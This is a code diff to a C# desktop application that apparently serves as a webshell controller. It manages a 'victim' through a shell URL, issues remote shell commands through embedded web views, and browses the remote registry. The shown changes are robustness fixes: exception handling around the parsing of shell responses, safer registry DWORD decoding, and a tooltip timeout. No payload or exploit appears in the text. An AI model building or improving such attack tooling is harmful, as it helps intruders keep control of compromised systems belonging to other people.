@@ -22,6 +22,7 @@ using Newtonsoft.Json.Linq;
 using Microsoft.VisualBasic;
 using ICSharpCode.TextEditor.Document;
 using ICSharpCode.TextEditor.Src.Document.FoldingStrategy;
+using System.Globalization;
 
 namespace Alien
 {
@@ -1339,7 +1340,6 @@ namespace Alien
             toolStripStatusLabel7.Text = string.Empty;
 
             textBox8.Text = m_victim.ShellURL;
-            Text = m_victim.ShellURL.Split('/')[2];
 
             treeView3.ImageList = fileImageList;
             m_fileMgr.m_ExtIcon.Images.Add(fileImageList.Images["folder"]);
@@ -2169,7 +2169,7 @@ namespace Alien
             tip.ToolTipIcon = ToolTipIcon.Info;
             tip.ToolTipTitle = "Please type here!";
 
-            tip.Show("Typing at this textbox is recommanded", textBox5);
+            tip.Show("Typing at this textbox is recommanded", textBox5, 5000);
         }
 
         private async void button2_Click(object sender, EventArgs e)
@@ -2189,22 +2189,29 @@ namespace Alien
             if (string.IsNullOrEmpty(szResp))
                 return;
 
-            var objJson = JsonConvert.DeserializeObject<dynamic>(szResp);
-            if (objJson == null)
-                return;
+            try
+            {
+                var objJson = JsonConvert.DeserializeObject<dynamic>(szResp);
+                if (objJson == null)
+                    return;
 
-            string status = objJson.status;
-            if (status != "success")
-                return;
+                string status = objJson.status;
+                if (status != "success")
+                    return;
 
-            string szb64Msg = objJson.msg;
-            if (string.IsNullOrEmpty(szb64Msg))
-                return;
+                string szb64Msg = objJson.msg;
+                if (string.IsNullOrEmpty(szb64Msg))
+                    return;
 
-            if (m_victim.m_bUnixLike)
-                webViewLinuxShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
-            else
-                webViewShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+                if (m_victim.m_bUnixLike)
+                    webViewLinuxShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+                else
+                    webViewShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+            }
+            catch
+            {
+
+            }
         }
 
         private async void textBox5_KeyDown(object sender, KeyEventArgs e)
@@ -2348,17 +2355,38 @@ namespace Alien
                     regItem.szType = value.Type;
 
                     if (value.Type.Contains("BINARY"))
+                    {
                         regItem.abData = value.Data;
+                    }
                     else if (value.Type.Contains("DWORD"))
-                        regItem.nData = BitConverter.ToUInt32(value.Data, 0);
+                    {
+                        if (value.Data != null && value.Data.Length == 4)
+                        {
+                            regItem.nData = BitConverter.ToUInt32(value.Data, 0);
+                        }
+                        else
+                        {
+                            string dwordText = Encoding.UTF8.GetString(value.Data);
+                            if (uint.TryParse(dwordText, out uint parsedDword))
+                                regItem.nData = parsedDword;
+                            else
+                                regItem.nData = 0;
+                        }
+                    }
                     else if (value.Type.Contains("QWORD"))
+                    {
                         regItem.nData = BitConverter.ToUInt64(value.Data, 0);
+                    }
                     else if (value.Type.Contains("MULTI"))
+                    {
                         regItem.asData = Encoding.Unicode.GetString(value.Data)
                             .TrimEnd('\0')
                             .Split('\0', StringSplitOptions.RemoveEmptyEntries);
+                    }
                     else
+                    {
                         regItem.szData = Encoding.Unicode.GetString(value.Data).TrimEnd('\0');
+                    }
 
                     item.Tag = regItem;
                 }
